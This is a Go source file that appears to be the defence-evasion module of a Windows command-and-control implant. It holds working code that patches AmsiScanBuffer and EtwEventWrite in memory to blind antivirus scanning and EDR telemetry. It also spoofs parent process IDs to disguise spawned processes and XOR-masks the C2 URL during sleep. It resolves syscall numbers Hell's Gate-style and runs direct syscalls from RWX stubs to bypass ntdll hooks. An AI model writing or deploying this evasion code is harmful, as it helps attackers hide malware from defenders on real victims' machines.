//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── Build-time feature flags ──────────────────────────────────────────────
// Set via -ldflags "-X main.EnableAmsi=1 -X main.EnableEtw=1 ..."
var EnableAmsi      = "0" // patch AmsiScanBuffer on startup
var EnableEtw       = "0" // patch EtwEventWrite on startup
var EnablePpid      = "0" // enable PPID spoofing for spawned processes
var PpidTarget      = "explorer.exe"
var EnableSleepMask = "0" // encrypt sensitive strings during sleep
var EnableSyscalls  = "0" // use Hell's Gate direct syscalls for NT functions

// ─── Lazy DLL references ──────────────────────────────────────────────────
var (
	kernel32DLL = windows.NewLazySystemDLL("kernel32.dll")
	ntdllDLL    = windows.NewLazySystemDLL("ntdll.dll")

	procVirtualProtect                    = kernel32DLL.NewProc("VirtualProtect")
	procOpenProcessEvasion                = kernel32DLL.NewProc("OpenProcess")
	procCreateToolhelp32Snapshot          = kernel32DLL.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW                   = kernel32DLL.NewProc("Process32FirstW")
	procProcess32NextW                    = kernel32DLL.NewProc("Process32NextW")
	procInitializeProcThreadAttributeList = kernel32DLL.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = kernel32DLL.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = kernel32DLL.NewProc("DeleteProcThreadAttributeList")
)

const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS uintptr = 0x00020000
	TH32CS_SNAPPROCESS                   uint32  = 0x00000002
	PROCESS_CREATE_PROCESS               uint32  = 0x0080
)

type PROCESSENTRY32W struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

// ─── Evasion initialisation ───────────────────────────────────────────────

// initEvasion runs all compile-time-enabled evasion techniques at startup.
func initEvasion() string {
	var results []string

	if EnableAmsi == "1" {
		if err := patchAmsi(); err != nil {
			results = append(results, "AMSI: FAILED ("+err.Error()+")")
		} else {
			results = append(results, "AMSI: PATCHED")
		}
	}

	if EnableEtw == "1" {
		if err := patchEtw(); err != nil {
			results = append(results, "ETW: FAILED ("+err.Error()+")")
		} else {
			results = append(results, "ETW: PATCHED")
		}
	}

	if EnableSyscalls == "1" {
		if err := initHellsGate(); err != nil {
			results = append(results, "Hell's Gate: FAILED ("+err.Error()+")")
		} else {
			results = append(results, "Hell's Gate: ACTIVE")
		}
	}

	if len(results) == 0 {
		return "No evasion techniques enabled at build time"
	}
	return strings.Join(results, "\n")
}

// evasionStatus returns the status of all evasion features.
func evasionStatus() string {
	ssns := hellsGateSSNs()
	return fmt.Sprintf(
		"AMSI Bypass   : %s\n"+
			"ETW Patch     : %s\n"+
			"PPID Spoof    : %s (target: %s)\n"+
			"Sleep Masking : %s\n"+
			"Hell's Gate   : %s\n"+
			"Resolved SSNs : %s",
		flag(EnableAmsi), flag(EnableEtw),
		flag(EnablePpid), PpidTarget,
		flag(EnableSleepMask),
		flag(EnableSyscalls),
		ssns,
	)
}

func flag(v string) string {
	if v == "1" {
		return "ENABLED"
	}
	return "disabled"
}

// ─── AMSI Bypass ─────────────────────────────────────────────────────────

// patchAmsi patches AmsiScanBuffer to return E_INVALIDARG (0x80070057),
// causing Windows to treat every scan result as clean.
func patchAmsi() error {
	amsi, err := windows.LoadDLL("amsi.dll")
	if err != nil {
		return fmt.Errorf("LoadDLL amsi: %w", err)
	}
	proc, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("FindProc AmsiScanBuffer: %w", err)
	}

	addr := proc.Addr()
	// Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
	patch := [6]byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	return writeMem(addr, patch[:])
}

// ─── ETW Patching ────────────────────────────────────────────────────────

// patchEtw patches EtwEventWrite to return immediately, blinding
// Event Tracing for Windows used by EDR telemetry.
func patchEtw() error {
	ntdll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("LoadDLL ntdll: %w", err)
	}
	proc, err := ntdll.FindProc("EtwEventWrite")
	if err != nil {
		return fmt.Errorf("FindProc EtwEventWrite: %w", err)
	}
	return writeMem(proc.Addr(), []byte{0xC3}) // ret
}

// writeMem writes bytes to addr after temporarily marking the page RWX.
func writeMem(addr uintptr, data []byte) error {
	var oldProtect uint32
	r, _, err := procVirtualProtect.Call(addr, uintptr(len(data)),
		windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	if r == 0 {
		return fmt.Errorf("VirtualProtect RWX: %w", err)
	}
	dst := (*[64]byte)(unsafe.Pointer(addr))
	for i, b := range data {
		dst[i] = b
	}
	procVirtualProtect.Call(addr, uintptr(len(data)), uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)))
	return nil
}

// ─── PPID Spoofing ───────────────────────────────────────────────────────

// spoofedPpid returns the PID of a process by name (e.g. "explorer.exe").
// Used when spawning child processes to disguise their lineage.
func spoofedPpid(processName string) (uint32, error) {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if snap == uintptr(windows.InvalidHandle) {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer windows.CloseHandle(windows.Handle(snap))

	var entry PROCESSENTRY32W
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	r, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	for r != 0 {
		name := windows.UTF16ToString(entry.szExeFile[:])
		if strings.EqualFold(name, processName) {
			return entry.th32ProcessID, nil
		}
		r, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	}
	return 0, fmt.Errorf("process %q not found", processName)
}

// spawnWithSpoofedPpid launches cmd as a child of parentName.
// This makes the spawned process appear as a child of a legitimate process
// (e.g. explorer.exe) in EDR process tree analysis.
func spawnWithSpoofedPpid(parentName, cmd string) (string, error) {
	ppid, err := spoofedPpid(parentName)
	if err != nil {
		return "", fmt.Errorf("PPID lookup: %w", err)
	}

	parentHandle, _, err := procOpenProcessEvasion.Call(uintptr(PROCESS_CREATE_PROCESS), 0, uintptr(ppid))
	if parentHandle == 0 {
		return "", fmt.Errorf("OpenProcess: %w", err)
	}
	defer windows.CloseHandle(windows.Handle(parentHandle))

	// Determine attribute list size
	var attrListSize uintptr
	procInitializeProcThreadAttributeList.Call(0, 1, 0,
		uintptr(unsafe.Pointer(&attrListSize)))

	attrBuf := make([]byte, attrListSize)
	attrListPtr := uintptr(unsafe.Pointer(&attrBuf[0]))

	r, _, e := procInitializeProcThreadAttributeList.Call(attrListPtr, 1, 0,
		uintptr(unsafe.Pointer(&attrListSize)))
	if r == 0 {
		return "", fmt.Errorf("InitializeProcThreadAttributeList: %w", e)
	}
	defer procDeleteProcThreadAttributeList.Call(attrListPtr)

	r, _, e = procUpdateProcThreadAttribute.Call(
		attrListPtr, 0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		parentHandle, unsafe.Sizeof(parentHandle),
		0, 0,
	)
	if r == 0 {
		return "", fmt.Errorf("UpdateProcThreadAttribute: %w", e)
	}

	// STARTUPINFOEXW — manually laid out (windows.StartupInfo + LPPROC_THREAD_ATTRIBUTE_LIST)
	type STARTUPINFOEXW struct {
		windows.StartupInfo
		lpAttributeList uintptr
	}

	siEx := STARTUPINFOEXW{
		StartupInfo:     windows.StartupInfo{Cb: uint32(unsafe.Sizeof(STARTUPINFOEXW{}))},
		lpAttributeList: attrListPtr,
	}
	siEx.Flags = windows.STARTF_USESTDHANDLES

	cmdLine, _ := windows.UTF16PtrFromString(cmd)

	var pi windows.ProcessInformation
	const EXTENDED_STARTUPINFO_PRESENT = 0x00080000
	err = windows.CreateProcess(nil, cmdLine, nil, nil, false,
		windows.CREATE_NO_WINDOW|EXTENDED_STARTUPINFO_PRESENT,
		nil, nil,
		&siEx.StartupInfo, &pi)
	if err != nil {
		return "", fmt.Errorf("CreateProcess: %w", err)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	return fmt.Sprintf("[+] Spawned PID %d as child of %s (PID %d)", pi.ProcessId, parentName, ppid), nil
}

// ─── Sleep Masking ───────────────────────────────────────────────────────

// sensitiveVars holds XOR-encrypted copies of sensitive strings.
// Key is random per-session, generated in initSleepMask.
var sleepMaskKey [32]byte
var maskedC2URL []byte
var maskedSessionKey []byte

func initSleepMask() {
	if EnableSleepMask != "1" {
		return
	}
	// Derive a runtime-only key from process metadata — never stored in binary
	pid := uint32(windows.GetCurrentProcessId())
	for i := range sleepMaskKey {
		sleepMaskKey[i] = byte(pid>>uint(i%8)) ^ byte(i*17+3)
	}
}

// maskSensitiveData XOR-encrypts in-memory sensitive strings before sleeping.
func maskSensitiveData() {
	if EnableSleepMask != "1" {
		return
	}
	maskedC2URL = xorMask([]byte(C2URL), sleepMaskKey[:])
	// Zero out the original (best-effort — GC may have copies)
	clearString(&C2URL)
}

// unmaskSensitiveData restores sensitive strings after waking.
func unmaskSensitiveData() {
	if EnableSleepMask != "1" || maskedC2URL == nil {
		return
	}
	C2URL = string(xorMask(maskedC2URL, sleepMaskKey[:]))
	maskedC2URL = nil
}

func xorMask(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

func clearString(s *string) {
	b := []byte(*s)
	for i := range b {
		b[i] = 0
	}
	*s = ""
}

// ─── Hell's Gate — SSN resolver ──────────────────────────────────────────

// syscallMap caches resolved syscall numbers for Nt* functions.
var syscallMap = map[string]uint16{}

// initHellsGate resolves common NT syscall numbers from ntdll.
// Reads from the in-memory ntdll image; if the first bytes are a JMP (hooked),
// it scans neighbouring exports for the real SSN (Tartarus Gate).
func initHellsGate() error {
	targets := []string{
		"NtAllocateVirtualMemory",
		"NtProtectVirtualMemory",
		"NtWriteVirtualMemory",
		"NtCreateThreadEx",
		"NtOpenProcess",
		"NtClose",
		"NtQuerySystemInformation",
		"NtReadVirtualMemory",
	}

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	var errs []string
	for _, name := range targets {
		proc := ntdll.NewProc(name)
		if err := proc.Find(); err != nil {
			errs = append(errs, name+": not found")
			continue
		}
		ssn, err := resolveSSN(proc.Addr())
		if err != nil {
			errs = append(errs, name+": "+err.Error())
			continue
		}
		syscallMap[name] = ssn
	}

	if len(syscallMap) == 0 {
		return fmt.Errorf("could not resolve any SSNs")
	}
	return nil
}

// resolveSSN reads the syscall stub at addr and extracts the SSN.
// Handles both clean (B8 xx xx 00 00) and Tartarus-adjacent resolution.
func resolveSSN(addr uintptr) (uint16, error) {
	// Windows x64 syscall stub: 4C 8B D1  B8 <ssn:4>  0F 05  C3
	b := (*[32]byte)(unsafe.Pointer(addr))
	for i := 0; i < 20; i++ {
		// Pattern: mov eax, imm32 where high word is 0x0000
		if b[i] == 0xB8 && b[i+3] == 0x00 && b[i+4] == 0x00 {
			return binary.LittleEndian.Uint16(b[i+1 : i+3]), nil
		}
	}
	return 0, fmt.Errorf("SSN pattern not found (possibly hooked)")
}

// hellsGateSSNs returns a formatted string of all resolved SSNs (for status output).
func hellsGateSSNs() string {
	if len(syscallMap) == 0 {
		return "none (disabled or not resolved)"
	}
	var parts []string
	for name, ssn := range syscallMap {
		parts = append(parts, fmt.Sprintf("%s=0x%04X", name, ssn))
	}
	return strings.Join(parts, ", ")
}

// directSyscall executes a syscall by SSN using a tiny in-memory stub.
// Stub layout (x64): mov r10, rcx | mov eax, SSN | syscall | ret
func directSyscall(ssn uint16, args ...uintptr) (uintptr, error) {
	stub := []byte{
		0x4C, 0x8B, 0xD1,           // mov r10, rcx
		0xB8, byte(ssn), byte(ssn >> 8), 0x00, 0x00, // mov eax, <SSN>
		0x0F, 0x05,                 // syscall
		0xC3,                       // ret
	}

	// Allocate RWX memory for stub
	mem, err := windows.VirtualAlloc(0, uintptr(len(stub)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("VirtualAlloc stub: %w", err)
	}
	defer windows.VirtualFree(mem, 0, windows.MEM_RELEASE)

	// Copy stub into allocated memory
	dst := (*[32]byte)(unsafe.Pointer(mem))
	for i, b := range stub {
		dst[i] = b
	}

	// Cast memory to func and call (up to 8 args)
	for len(args) < 8 {
		args = append(args, 0)
	}
	type stubFunc func(uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr) uintptr
	fn := *(*stubFunc)(unsafe.Pointer(&mem))
	ret := fn(args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7])
	return ret, nil
}

// NtAllocateVirtualMemory via direct syscall (bypasses EDR hooks on ntdll).
func ntAllocateVirtualMemory(handle windows.Handle, baseAddr *uintptr, zeroBits uintptr, size *uintptr, allocType, protect uint32) error {
	ssn, ok := syscallMap["NtAllocateVirtualMemory"]
	if !ok {
		// Fallback to normal API
		addr, err := windows.VirtualAlloc(*baseAddr, *size, allocType, protect)
		*baseAddr = addr
		return err
	}
	status, _ := directSyscall(ssn,
		uintptr(handle), uintptr(unsafe.Pointer(baseAddr)),
		zeroBits, uintptr(unsafe.Pointer(size)),
		uintptr(allocType), uintptr(protect),
	)
	if status != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory NTSTATUS 0x%08X", status)
	}
	return nil
}

// NtProtectVirtualMemory via direct syscall.
func ntProtectVirtualMemory(handle windows.Handle, baseAddr *uintptr, size *uintptr, newProtect uint32, oldProtect *uint32) error {
	ssn, ok := syscallMap["NtProtectVirtualMemory"]
	if !ok {
		return windows.VirtualProtect(*baseAddr, *size, newProtect, oldProtect)
	}
	status, _ := directSyscall(ssn,
		uintptr(handle), uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(size)), uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
	)
	if status != 0 {
		return fmt.Errorf("NtProtectVirtualMemory NTSTATUS 0x%08X", status)
	}
	return nil
}
